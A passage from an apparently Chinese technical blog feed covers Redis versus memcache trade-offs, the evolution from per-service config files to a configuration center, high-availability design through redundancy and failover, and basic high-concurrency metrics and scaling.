<h2 id="四、存储的内容比较大，选择-Redis-更合适"><a href="#四、存储的内容比较大，选择-Redis-更合适" class="headerlink" title="四、存储的内容比较大，选择 Redis 更合适"></a>四、存储的内容比较大，选择 Redis 更合适</h2><p>&emsp;&emsp;memcache 的 value 存储，最大为 1M，如果存储的 value 很大，只能使用 Redis。</p>
<p>&emsp;&emsp;当然，Redis 与 memcache 相比，<strong>由于底层实现机制的差异，也有一些“劣势”的情况</strong>。</p>
<h3 id="情况一：由于内存分配机制的差异，Redis-可能导致内存碎片"><a href="#情况一：由于内存分配机制的差异，Redis-可能导致内存碎片" class="headerlink" title="情况一：由于内存分配机制的差异，Redis 可能导致内存碎片"></a>情况一：由于内存分配机制的差异，Redis 可能导致内存碎片</h3><p>&emsp;&emsp;memcache 使用<strong>预分配内存池</strong>的方式管理内存，能够省去内存分配时间。<br>&emsp;&emsp;Redis 则是<strong>临时申请空间</strong>，可能导致碎片。<br>&emsp;&emsp;从这一点上，mc会更快一些。</p>
<h3 id="情况二：由于虚拟内存使用的差异，Redis-可能会刷盘影响性能"><a href="#情况二：由于虚拟内存使用的差异，Redis-可能会刷盘影响性能" class="headerlink" title="情况二：由于虚拟内存使用的差异，Redis 可能会刷盘影响性能"></a>情况二：由于虚拟内存使用的差异，Redis 可能会刷盘影响性能</h3><p>&emsp;&emsp;memcache 把所有的数据存储在<strong>物理内存</strong>里。<br>&emsp;&emsp;Redis 有自己的 <strong>VM 机制</strong>，理论上能够存储比物理内存更多的数据，当数据超量时，会引发 swap，把冷数据刷到磁盘上。<br>&emsp;&emsp;从这一点上，数据量大时，mc 会更快一些。</p>
<blockquote>
<p>&emsp;&emsp;画外音：新版本 Redis 已经优化。</p>
</blockquote>
<h3 id="情况三：由于网络模型的差异，Redis-可能会因为-CPU-计算影响-IO-调度"><a href="#情况三：由于网络模型的差异，Redis-可能会因为-CPU-计算影响-IO-调度" class="headerlink" title="情况三：由于网络模型的差异，Redis 可能会因为 CPU 计算影响 IO 调度"></a>情况三：由于网络模型的差异，Redis 可能会因为 CPU 计算影响 IO 调度</h3><p>&emsp;&emsp;memcache 使用<strong>非阻塞 IO 复用模型</strong>，Redis 也是使用<strong>非阻塞 IO 复用模型</strong>。<br>&emsp;&emsp;但由于 Redis 还提供一些非 KV 存储之外的排序，聚合功能，在执行这些功能时，<strong>复杂的 CPU 计算，会阻塞整个 IO 调度</strong>。<br>&emsp;&emsp;从这一点上，由于 Redis 提供的功能较多，mc 会更快一些。</p>
<h3 id="情况四：由于线程模型的差异，Redis-难以利用多核特效提升性能"><a href="#情况四：由于线程模型的差异，Redis-难以利用多核特效提升性能" class="headerlink" title="情况四：由于线程模型的差异，Redis 难以利用多核特效提升性能"></a>情况四：由于线程模型的差异，Redis 难以利用多核特效提升性能</h3><p>&emsp;&emsp;memcache 使用<strong>多线程</strong>，主线程监听，worker 子线程接受请求，执行读写，这个过程中，可能存在锁冲突。<br>&emsp;&emsp;Redis 使用<strong>单线程</strong>，虽无锁冲突，但难以利用多核的特性提升整体吞吐量。<br>&emsp;&emsp;从这一点上，mc 会快一些。</p>
<h3 id="情况五：由于缺乏-auto-sharding，Redis-只能手动水平扩展"><a href="#情况五：由于缺乏-auto-sharding，Redis-只能手动水平扩展" class="headerlink" title="情况五：由于缺乏 auto-sharding，Redis 只能手动水平扩展"></a>情况五：由于缺乏 auto-sharding，Redis 只能手动水平扩展</h3><p>&emsp;&emsp;不管是 Redis 还是 memcache，服务端集群<strong>没有天然支持水平扩展</strong>，需要在客户端进行分片，这其实对调用方并不友好。如果能服务端集群能够支持水平扩展，会更完美一些。</p>
<hr>
<h1 id="互联网架构，究竟为什么需要配置中心？"><a href="#互联网架构，究竟为什么需要配置中心？" class="headerlink" title="互联网架构，究竟为什么需要配置中心？"></a>互联网架构，究竟为什么需要配置中心？</h1><p>&emsp;&emsp;配置中心是互联网架构体系中很重要的一块，但<strong>为什么会有配置中心</strong>，<strong>是不是一开始就要有配置中心</strong>，它<strong>究竟解决什么问题</strong>，这是今天要讨论的问题。</p>
<p>&emsp;&emsp;随着互联网业务的越来越复杂，用户量与流量越来越大，“<strong>服务化分层</strong>”是架构演进的必由之路。</p>
<figure class="image-box">
                <img src="9.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;如上图，站点应用会调用服务，上游服务调用底层服务，依赖关系会变得非常复杂。</p>
<p>&emsp;&emsp;对于同一个服务：<br>&emsp;（1）它往往有多个上游调用；<br>&emsp;（2）为了保证高可用，它往往是若干个节点组成的集群提供服务。</p>
<figure class="image-box">
                <img src="10.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;如上图，用户中心服务 user-service 有三个节点，ip1/ip2/ip3 对上游提供服务，任何一个节点当机，都不影响服务的可用性。</p>
<p>&emsp;那么<strong>问题来了</strong>：  </p>
<ul>
<li>调用方如何维护下游服务集群配置？  </li>
<li>当服务集群增减节点时，调用方是否有感知？</li>
</ul>
<h2 id="初期：“配置私藏”架构"><a href="#初期：“配置私藏”架构" class="headerlink" title="初期：“配置私藏”架构"></a>初期：“配置私藏”架构</h2><p>&emsp;&emsp;“配置私藏”是配置的最初级阶段，上游调用下游，<strong>每个上游都有一个专属的私有配置文件，记录被调用下游的每个节点配置信息</strong>。</p>
<figure class="image-box">
                <img src="11.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;如上图：<br>&emsp;（1）用户中心 user-service 有 ip1/ip2/ip3 三个节点；<br>&emsp;（2）service1 调用了用户中心，它有一个专属配置文件 s1.conf，里面配置了 us 的集群是 ip1/ip2/ip3；<br>&emsp;（3）service2 也调用了用户中心，同理有个配置文件 s2.conf，记录了 us 集群是 ip1/ip2/ip3；<br>&emsp;（4）web2 也调用了用户中心，同理 w2.conf，配置了 us 集群是 ip1/ip2/ip3。</p>
<blockquote>
<p>&emsp;&emsp;画外音：是不是很熟悉？绝大部分公司，初期都是这么玩的。</p>
</blockquote>
<h3 id="“配置私藏”架构的缺点是什么呢？"><a href="#“配置私藏”架构的缺点是什么呢？" class="headerlink" title="“配置私藏”架构的缺点是什么呢？"></a>“配置私藏”架构的缺点是什么呢？</h3><figure class="image-box">
                <img src="12.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;来看一个容量变化的需求：<br>&emsp;（1）运维检测出 ip1 节点的硬盘性能下降，通知研发未来要将 <strong>ip1 节点下线</strong>；<br>&emsp;（2）由于 5 月 8 日要做大促运营活动，未来流量会激增，研发准备<strong>增加两个节点 ip4 和 ip5</strong>。</p>
<h3 id="此时要怎么做呢？"><a href="#此时要怎么做呢？" class="headerlink" title="此时要怎么做呢？"></a>此时要怎么做呢？</h3><figure class="image-box">
                <img src="13.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;需要用户中心的负责人<strong>通知所有上游调用者，修改“私藏”的配置，并重启上游</strong>，连接到新的集群上去。在 ip1 上没有流量之后，通知运维将 ip1 节点下线，以完成整个缩容扩容过程。</p>
<h3 id="这种方案存在什么问题呢？"><a href="#这种方案存在什么问题呢？" class="headerlink" title="这种方案存在什么问题呢？"></a>这种方案存在什么问题呢？</h3><p>&emsp;&emsp;当业务复杂度较高，研发人数较多，服务依赖关系较复杂的时候，就没这么简单了。</p>
<p>&emsp;&emsp;问题一：调用方很痛，容量变化的是你，凭啥修改配置重启的是我？这是一个典型的“反向依赖”架构设计，上下游通过配置耦合，不合理。</p>
<p>&emsp;&emsp;问题二：服务方很痛，ta 不知道有多少个上游调用了自己，往往只能通过以下方式来定位上游：<br>&emsp;（1）群里吼<br>&emsp;（2）发邮件询问<br>&emsp;（3）通过连接找到 ip，通过 ip 问运维，找到机器负责人，再通过机器负责人找到对应调用服务</p>
<blockquote>
<p>&emsp;&emsp;画外音：是不是似曾相识?</p>
</blockquote>
<p>&emsp;&emsp;不管哪种方式，都很有可能遗漏，导致 ip1 一直有流量难以下线，ip4/ip5 的流量难以均匀迁移过来。该如何优化呢？</p>
<h2 id="中期：“全局配置”架构"><a href="#中期：“全局配置”架构" class="headerlink" title="中期：“全局配置”架构"></a>中期：“全局配置”架构</h2><p>&emsp;&emsp;架构的升级并不是一步到位的，先来用最低的成本来解决上述“修改配置重启”的问题一。</p>
<figure class="image-box">
                <img src="14.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;“全局配置”架构：对于<strong>通用的服务</strong>，建立全局配置文件，消除配置私藏：<br>&emsp;（1）运维层面制定规范，新建全局配置文件，例如 /opt/global.conf；</p>
<blockquote>
<p>&emsp;&emsp;画外音：如果配置较多，注意做好配置的垂直拆分。</p>
</blockquote>
<p>&emsp;（2）对于服务方，如果是通用的服务，集群信息配置在 global.conf 里；<br>&emsp;（3）对于调用方，调用方禁止配置私藏，必须从 global.conf 里读取通用下游配置。</p>
<h3 id="全局配置有什么好处呢？"><a href="#全局配置有什么好处呢？" class="headerlink" title="全局配置有什么好处呢？"></a>全局配置有什么好处呢？</h3><p>&emsp;（1）如果下游容量变化，只需要修改一处配置 global.conf，而不需要各个上游修改；<br>&emsp;（2）调用方下一次重启的时候，自动迁移到扩容后的集群上来了；<br>&emsp;（3）修改成本非常小，读取配置文件目录变了而已。</p>
<h3 id="全局配置有什么不足呢？"><a href="#全局配置有什么不足呢？" class="headerlink" title="全局配置有什么不足呢？"></a>全局配置有什么不足呢？</h3><p>&emsp;&emsp;如果调用方一直不重启，就没有办法将流量迁移到新集群上去了。</p>
<h3 id="有没有方面实现自动流量迁移呢？"><a href="#有没有方面实现自动流量迁移呢？" class="headerlink" title="有没有方面实现自动流量迁移呢？"></a>有没有方面实现自动流量迁移呢？</h3><figure class="image-box">
                <img src="15.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;答案是肯定的，只需要引入<strong>两个并不复杂的组件</strong>，就能实现调用方的流量自动迁移：<br>&emsp;（1）<strong>文件监控组件 FileMonitor</strong><br>&emsp;&emsp;作用是监控文件的变化，起一个 timer，定期监控文件的 ModifyTime 或者 md5 就能轻松实现，当文件变化后，实施回调。<br>&emsp;（2）<strong>动态连接池组件 DynamicConnectionPool</strong><br>&emsp;&emsp;“连接池组件”是 RPC-client 中的一个子组件，用来维护与多个 RPC-server 节点之间的连接。所谓“动态连接池”，是指连接池中的连接可以动态增加和减少。  </p>
<blockquote>
<p>&emsp;&emsp;画外音：用锁来互斥，很容易实现。</p>
</blockquote>
<p>&emsp;&emsp;引入了这两个组件之后：<br>&emsp;（1）一旦全局配置文件变化，文件监控组件实施回调；<br>&emsp;（2）如果动态连接池组件发现配置中减少了一些节点，就动态的将对应连接销毁，如果增加了一些节点，就动态建立连接，自动完成下游节点的增容与缩容。</p>
<h2 id="终版：“配置中心”架构"><a href="#终版：“配置中心”架构" class="headerlink" title="终版：“配置中心”架构"></a>终版：“配置中心”架构</h2><p>&emsp;&emsp;“全局配置”架构是一个能够快速落地的，解决“修改配置重启”问题的方案，但它<strong>仍然解决不了，服务提供方“不知道有多少个上游调用了自己”这个问题</strong>。</p>
<p>&emsp;&emsp;如果不知道多少上游调用了自己：<br>&emsp;（1）“按照调用方限流”<br>&emsp;（2）“绘制全局架构依赖图”<br>&emsp;&emsp;等这类需求便难以实现，<strong>怎么办</strong>？</p>
<p>&emsp;&emsp;<strong>“配置中心”架构能够完美解决。</strong></p>
<figure class="image-box">
                <img src="16.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;对比“全局配置”与“配置中心”的架构图，会发现配置由<strong>静态的文件</strong>升级为<strong>动态的服务</strong>：<br>&emsp;（1）整个配置中心子系统由 zk、conf-center 服务，DB 配置存储与，conf-web 配置后台组成；<br>&emsp;（2）所有下游服务的配置，通过后台设置在配置中心里；<br>&emsp;（3）所有上游需要拉取配置，需要去配置中心注册，拉取下游服务配置信息（ip1/ip2/ip3）。</p>
<figure class="image-box">
                <img src="17.webp" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;<strong>当下游服务需要扩容缩容时</strong>：<br>&emsp;（1）conf-web 配置后台进行设置，新增 ip4/ip5，减少 ip1；<br>&emsp;（2）conf-center 服务将变更的配置推送给已经注册关注相关配置的调用方；<br>&emsp;（3）结合动态连接池组件，完成自动的扩容与缩容。</p>
<h3 id="“配置中心”架构有什么好处呢？"><a href="#“配置中心”架构有什么好处呢？" class="headerlink" title="“配置中心”架构有什么好处呢？"></a>“配置中心”架构有什么好处呢？</h3><p>&emsp;（1）调用方不需要再重启；<br>&emsp;（2）服务方从配置中心中很清楚的知道上游依赖关系，从而实施按照调用方限流；<br>&emsp;（3）很容易从配置中心得到全局架构依赖关系。</p>
<p>&emsp;&emsp;痛点一、痛点二同时解决。</p>
<h3 id="“配置中心”架构有什么不足呢？"><a href="#“配置中心”架构有什么不足呢？" class="headerlink" title="“配置中心”架构有什么不足呢？"></a>“配置中心”架构有什么不足呢？</h3><p>&emsp;&emsp;一来，系统复杂度相对较高；<br>&emsp;&emsp;二来，对配置中心的可靠性要求较高，一处挂全局挂。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="究竟要解决什么痛点？"><a href="#究竟要解决什么痛点？" class="headerlink" title="究竟要解决什么痛点？"></a>究竟要解决什么痛点？</h3><p>&emsp;&emsp;<strong>上游痛</strong>：扩容的是下游，改配置重启的是上游；<br>&emsp;&emsp;<strong>下游痛</strong>：不知道谁依赖于自己；<br>&emsp;&emsp;总之，<strong>难以实施服务治理</strong>。</p>
<h3 id="究竟如何解决上述痛点？"><a href="#究竟如何解决上述痛点？" class="headerlink" title="究竟如何解决上述痛点？"></a>究竟如何解决上述痛点？</h3><p>&emsp;&emsp;一、“配置私藏”架构；<br>&emsp;&emsp;二、“全局配置文件”架构；<br>&emsp;&emsp;三、“配置中心”架构。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序设计 </tag>
            
            <tag> RabbitMQ </tag>
            
            <tag> Redis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[什么是 高可用 和 高并发]]></title>
      <url>/2020/01/20/WhatIsHighAvailabilityAndHighConcurrency/</url>
      <content type="html"><![CDATA[<blockquote>
<p>高可用：<a href="https://mp.weixin.qq.com/s/p0LsxT-JUS7zYg23M7nupQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/p0LsxT-JUS7zYg23M7nupQ</a><br>高并发：<a href="https://mp.weixin.qq.com/s/bEkd2lcuK59Gpncuvyj1Ww" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/bEkd2lcuK59Gpncuvyj1Ww</a>  </p>
</blockquote>
<a id="more"></a>

<h1 id="高可用"><a href="#高可用" class="headerlink" title="高可用"></a>高可用</h1><h2 id="一、什么是高可用"><a href="#一、什么是高可用" class="headerlink" title="一、什么是高可用"></a>一、什么是高可用</h2><p>&emsp;&emsp;<strong>高可用</strong> HA（High Availability）是分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计减少系统不能提供服务的时间。<br>&emsp;&emsp;假设系统一直能够提供服务，我们说系统的可用性是 100% 。如果系统每运行 100 个时间单位，会有 1 个时间单位无法提供服务，我们说系统的可用性是 99% 。<br>&emsp;&emsp;很多公司的高可用目标是 4 个 9，也就是 99.99% ，这就意味着，系统的年停机时间为 8.76 个小时。<br>&emsp;&emsp;百度的搜索首页，是业内公认高可用保障非常出色的系统，甚至人们会通过 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 能不能访问来判断“网络的连通性”，百度高可用的服务让人留下了“网络通畅，百度就能访问”，“百度打不开，应该是网络连不上”的印象，这其实是对百度 HA 最高的褒奖。</p>
<h2 id="二、如何保障系统的高可用"><a href="#二、如何保障系统的高可用" class="headerlink" title="二、如何保障系统的高可用"></a>二、如何保障系统的高可用</h2><p>&emsp;&emsp;我们都知道，单点是系统高可用的大敌，单点往往是系统高可用最大的风险和敌人，应该尽量在系统设计的过程中避免单点。方法论上，高可用保证的原则是“集群化”，或者叫“冗余”：只有一个单点，挂了服务会受影响；如果有冗余备份，挂了还有其他 backup 能够顶上。<br>&emsp;&emsp;保证系统高可用，架构设计的<strong>核心准则</strong>是：<strong>冗余</strong>。<br>&emsp;&emsp;有了冗余之后，还不够，每次出现故障需要人工介入恢复势必会增加系统的不可服务实践。所以，又往往是通过“<strong>自动故障转移</strong>”来实现系统的高可用。</p>
<p>&emsp;&emsp;接下来我们看下典型互联网架构中，如何通过冗余+自动故障转移来保证系统的高可用特性。</p>
<h2 id="三、常见的互联网分层架构"><a href="#三、常见的互联网分层架构" class="headerlink" title="三、常见的互联网分层架构"></a>三、常见的互联网分层架构</h2><figure class="image-box">
                <img src="1.webp" alt title class>
                <p></p>
            </figure>

<p>常见互联网分布式架构如上，分为：<br>（1）<strong>客户端层</strong>：典型调用方是浏览器 browser 或者手机应用 APP；<br>（2）<strong>反向代理层</strong>：系统入口，反向代理；<br>（3）<strong>站点应用层</strong>：实现核心应用逻辑，返回 html 或者 json；<br>（4）<strong>服务层</strong>：如果实现了服务化，就有这一层；<br>（5）<strong>数据-缓存层</strong>：缓存加速访问存储；<br>（6）<strong>数据-数据库层</strong>：数据库固化数据存储；</p>
<p>整个系统的高可用，又是通过每一层的<strong>冗余+自动故障转移</strong>来综合实现的。</p>
<h2 id="四、分层高可用架构实践"><a href="#四、分层高可用架构实践" class="headerlink" title="四、分层高可用架构实践"></a>四、分层高可用架构实践</h2><h3 id="【客户端层-gt-反向代理层】的高可用"><a href="#【客户端层-gt-反向代理层】的高可用" class="headerlink" title="【客户端层 -&gt; 反向代理层】的高可用"></a>【客户端层 -&gt; 反向代理层】的高可用</h3><figure class="image-box">
                <img src="2.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;【客户端层】到【反向代理层】的高可用，是通过反向代理层的冗余来实现的。以 nginx 为例：有两台 nginx，一台对线上提供服务，另一台冗余以保证高可用，常见的实践是 keepalived 存活探测，相同 virtual IP 提供服务。</p>
<figure class="image-box">
                <img src="3.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;自动故障转移：当 nginx 挂了的时候，keepalived 能够探测到，会自动的进行故障转移，将流量自动迁移到 shadow-nginx，由于使用的是相同的 virtual IP，这个切换过程对调用方是透明的。</p>
<h3 id="【反向代理层-gt-站点层】的高可用"><a href="#【反向代理层-gt-站点层】的高可用" class="headerlink" title="【反向代理层 -&gt; 站点层】的高可用"></a>【反向代理层 -&gt; 站点层】的高可用</h3><figure class="image-box">
                <img src="4.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;【反向代理层】到【站点层】的高可用，是通过站点层的冗余来实现的。假设反向代理层是 nginx，<code>nginx.conf</code>里能够配置多个 web 后端，并且 nginx 能够探测到多个后端的存活性。</p>
<figure class="image-box">
                <img src="5.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;自动故障转移：当 web-server 挂了的时候，nginx 能够探测到，会自动的进行故障转移，将流量自动迁移到其他的 web-server，整个过程由 nginx 自动完成，对调用方是透明的。</p>
<h3 id="【站点层-gt-服务层】的高可用"><a href="#【站点层-gt-服务层】的高可用" class="headerlink" title="【站点层 -&gt; 服务层】的高可用"></a>【站点层 -&gt; 服务层】的高可用</h3><figure class="image-box">
                <img src="6.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;【站点层】到【服务层】的高可用，是通过服务层的冗余来实现的。“服务连接池”会建立与下游服务多个连接，每次请求会“随机”选取连接来访问下游服务。</p>
<figure class="image-box">
                <img src="7.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;自动故障转移：当 service 挂了的时候，service-connection-pool 能够探测到，会自动的进行故障转移，将流量自动迁移到其他的 service，整个过程由连接池自动完成，对调用方是透明的（所以说 RPC-client 中的服务连接池是很重要的基础组件）。</p>
<h3 id="【服务层-gt-缓存层】的高可用"><a href="#【服务层-gt-缓存层】的高可用" class="headerlink" title="【服务层 -&gt; 缓存层】的高可用"></a>【服务层 -&gt; 缓存层】的高可用</h3><figure class="image-box">
                <img src="8.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;【服务层】到【缓存层】的高可用，是通过缓存数据的冗余来实现的。<br>&emsp;&emsp;缓存层的数据冗余又有几种方式：第一种是利用客户端的封装，service 对 cache 进行双读或者双写。</p>
<figure class="image-box">
                <img src="9.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;缓存层也可以通过支持主从同步的缓存集群来解决缓存层的高可用问题。<br>&emsp;&emsp;以 Redis 为例，Redis 天然支持主从同步，Redis 官方也有 sentinel 哨兵机制，来做 Redis 的存活性检测。</p>
<figure class="image-box">
                <img src="10.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;自动故障转移：当 redis 主挂了的时候，sentinel 能够探测到，会通知调用方访问新的 redis，整个过程由 sentinel 和 redis 集群配合完成，对调用方是透明的。</p>
<p>&emsp;&emsp;说完缓存的高可用，这里要多说一句，业务对缓存并不一定有“高可用”要求，更多的对缓存的使用场景，是用来“加速数据访问”：把一部分数据放到缓存里，如果缓存挂了或者缓存没有命中，是可以去后端的数据库中再取数据的。<br>&emsp;&emsp;这类允许 “cache miss” 的业务场景，缓存架构的建议是：</p>
<figure class="image-box">
                <img src="11.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;将 kv 缓存封装成服务集群，上游设置一个代理（代理可以用集群冗余的方式保证高可用），代理的后端根据缓存访问的 key 水平切分成若干个实例，每个实例的访问并不做高可用。</p>
<figure class="image-box">
                <img src="12.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;缓存实例挂了屏蔽：当有水平切分的实例挂掉时，代理层直接返回 cache miss，此时缓存挂掉对调用方也是透明的。key 水平切分实例减少，不建议做 re-hash，这样容易引发缓存数据的不一致。</p>
<h3 id="【服务层-gt-数据库层】的高可用"><a href="#【服务层-gt-数据库层】的高可用" class="headerlink" title="【服务层 -&gt; 数据库层】的高可用"></a>【服务层 -&gt; 数据库层】的高可用</h3><p>&emsp;&emsp;大部分互联网技术，数据库层都用了“主从同步，读写分离”架构，所以数据库层的高可用，又分为“读库高可用”与“写库高可用”两类。</p>
<h4 id="【服务层-gt-数据库层“读”】的高可用"><a href="#【服务层-gt-数据库层“读”】的高可用" class="headerlink" title="【服务层 -&gt; 数据库层“读”】的高可用"></a>【服务层 -&gt; 数据库层“读”】的高可用</h4><figure class="image-box">
                <img src="13.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;【服务层】到【数据库读】的高可用，是通过读库的冗余来实现的。<br>&emsp;&emsp;既然冗余了读库，一般来说就至少有2个从库，“数据库连接池”会建立与读库多个连接，每次请求会路由到这些读库。</p>
<figure class="image-box">
                <img src="14.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;自动故障转移：当读库挂了的时候，db-connection-pool 能够探测到，会自动的进行故障转移，将流量自动迁移到其他的读库，整个过程由连接池自动完成，对调用方是透明的（所以说DAO中的数据库连接池是很重要的基础组件）。</p>
<h4 id="【服务层-gt-数据库层“写”】的高可用"><a href="#【服务层-gt-数据库层“写”】的高可用" class="headerlink" title="【服务层 -&gt; 数据库层“写”】的高可用"></a>【服务层 -&gt; 数据库层“写”】的高可用</h4><figure class="image-box">
                <img src="15.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;【服务层】到【数据库写】的高可用，是通过写库的冗余来实现的。<br>&emsp;&emsp;以 MySQL 为例，可以设置两个 MySQL 双主同步，一台对线上提供服务，另一台冗余以保证高可用，常见的实践是 keepalived 存活探测，相同 virtual IP 提供服务。</p>
<figure class="image-box">
                <img src="16.webp" alt title class>
                <p></p>
            </figure>
<p>&emsp;&emsp;自动故障转移：当写库挂了的时候，keepalived 能够探测到，会自动的进行故障转移，将流量自动迁移到 shadow-db-master，由于使用的是相同的 virtual IP，这个切换过程对调用方是透明的。</p>
<h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>&emsp;&emsp;高可用 HA（High Availability）是分布式系统架构设计中必须考虑的因素之一，它通常是指，通过设计减少系统不能提供服务的时间。</p>
<p>&emsp;&emsp;方法论上，高可用是通过<strong>冗余+自动故障转移</strong>来实现的。</p>
<p>&emsp;&emsp;整个互联网分层系统架构的高可用，又是通过每一层的冗余+自动故障转移来综合实现的，具体的：<br>&emsp;（1）【客户端层】到【反向代理层】的高可用，是通过反向代理层的冗余实现的，常见实践是 keepalived + virtual IP 自动故障转移；<br>&emsp;（2）【反向代理层】到【站点层】的高可用，是通过站点层的冗余实现的，常见实践是 nginx 与 web-server 之间的存活性探测与自动故障转移；<br>&emsp;（3）【站点层】到【服务层】的高可用，是通过服务层的冗余实现的，常见实践是通过 service-connection-pool 来保证自动故障转移；<br>&emsp;（4）【服务层】到【缓存层】的高可用，是通过缓存数据的冗余实现的，常见实践是缓存客户端双读双写，或者利用缓存集群的主从数据同步与 sentinel 保活与自动故障转移；更多的业务场景，对缓存没有高可用要求，可以使用缓存服务化来对调用方屏蔽底层复杂性；<br>&emsp;（5）【服务层】到【数据库“读”】的高可用，是通过读库的冗余实现的，常见实践是通过 db-connection-pool 来保证自动故障转移；<br>&emsp;（6）【服务层】到【数据库“写”】的高可用，是通过写库的冗余实现的，常见实践是 keepalived + virtual IP 自动故障转移；</p>
<hr>
<h1 id="高并发"><a href="#高并发" class="headerlink" title="高并发"></a>高并发</h1><h2 id="什么是高并发？"><a href="#什么是高并发？" class="headerlink" title="什么是高并发？"></a>什么是高并发？</h2><p>&emsp;&emsp;高并发（High Concurrency）是互联网分布式系统架构设计中必须考虑的因素之一，它通常是指，<strong>通过设计保证系统能够同时并行处理很多请求</strong>。</p>
<h2 id="高并发相关的常见指标有哪些？"><a href="#高并发相关的常见指标有哪些？" class="headerlink" title="高并发相关的常见指标有哪些？"></a>高并发相关的常见指标有哪些？</h2><ul>
<li>响应时间（Response Time）</li>
<li>吞吐量（Throughput）</li>
<li>每秒查询率 QPS（Query Per Second）</li>
<li>并发用户数</li>
</ul>
<h3 id="什么是响应时间？"><a href="#什么是响应时间？" class="headerlink" title="什么是响应时间？"></a>什么是响应时间？</h3><p>&emsp;&emsp;系统对请求做出响应的时间。<br>&emsp;&emsp;例如：系统处理一个 HTTP 请求需要 200ms，这个 200ms 就是系统的响应时间。</p>
<h3 id="什么是吞吐量？"><a href="#什么是吞吐量？" class="headerlink" title="什么是吞吐量？"></a>什么是吞吐量？</h3><p>&emsp;&emsp;单位时间内处理的请求数量。</p>
<h3 id="什么是-QPS？"><a href="#什么是-QPS？" class="headerlink" title="什么是 QPS？"></a>什么是 QPS？</h3><p>&emsp;&emsp;每秒响应请求数。在互联网领域，这个指标和吞吐量区分的没有这么明显。</p>
<h3 id="什么是并发用户数？"><a href="#什么是并发用户数？" class="headerlink" title="什么是并发用户数？"></a>什么是并发用户数？</h3><p>&emsp;&emsp;同时承载正常使用系统功能的用户数量。<br>&emsp;&emsp;例如：一个即时通讯系统，同时在线量一定程度上代表了系统的并发用户数。</p>
<h2 id="如何提升系统的并发能力？"><a href="#如何提升系统的并发能力？" class="headerlink" title="如何提升系统的并发能力？"></a>如何提升系统的并发能力？</h2><p>&emsp;&emsp;互联网分布式架构设计，提高系统并发能力的方式，方法论上主要有两种：<br>&emsp;&emsp;- 垂直扩展（Scale Up）<br>&emsp;&emsp;- 水平扩展（Scale Out）</p>
<h3 id="什么是垂直扩展？"><a href="#什么是垂直扩展？" class="headerlink" title="什么是垂直扩展？"></a>什么是垂直扩展？</h3><p>&emsp;&emsp;垂直扩展是指，<strong>提升单机处理能力</strong>，垂直扩展的方式又有两种：<br>&emsp;（1）<strong>增强单机硬件性能</strong>，例如：增加 CPU 核数如 32 核，升级更好的网卡如万兆，升级更好的硬盘如 SSD，扩充硬盘容量如 2T，扩充系统内存如 128G；<br>&emsp;（2）<strong>提升单机架构性能</strong>，例如：使用 Cache 来减少 IO 次数，使用异步来增加单服务吞吐量，使用无锁数据结构来减少响应时间；</p>
<blockquote>
<p>&emsp;&emsp;画外音：在互联网业务发展非常迅猛的早期，如果预算不是问题，强烈建议使用“增强单机硬件性能”的方式提升系统并发能力，因为这个阶段，公司的战略往往是发展业务抢时间，而“增强单机硬件性能”往往是最快的方法。</p>
</blockquote>
<h4 id="垂直扩展有什么瓶颈？"><a href="#垂直扩展有什么瓶颈？" class="headerlink" title="垂直扩展有什么瓶颈？"></a>垂直扩展有什么瓶颈？</h4><p>&emsp;&emsp;不管是提升单机硬件性能，还是提升单机架构性能，都有一个致命的<strong>不足</strong>：<strong>单机性能总是有极限的</strong>。</p>
<h4 id="如何突破单机的极限？"><a href="#如何突破单机的极限？" class="headerlink" title="如何突破单机的极限？"></a>如何突破单机的极限？</h4><p>&emsp;&emsp;互联网分布式架构设计，高并发终极解决方案还是水平扩展。</p>
<h3 id="什么是水平扩展？"><a href="#什么是水平扩展？" class="headerlink" title="什么是水平扩展？"></a>什么是水平扩展？</h3><p>&emsp;&emsp;<strong>只要增加服务器数量，就能线性扩充系统性能。</strong></p>
<h2 id="常见的互联网分层架构如何？"><a href="#常见的互联网分层架构如何？" class="headerlink" title="常见的互联网分层架构如何？"></a>常见的互联网分层架构如何？</h2><figure class="image-box">
                <img src="17.webp" alt title class>
                <p></p>
            </figure>

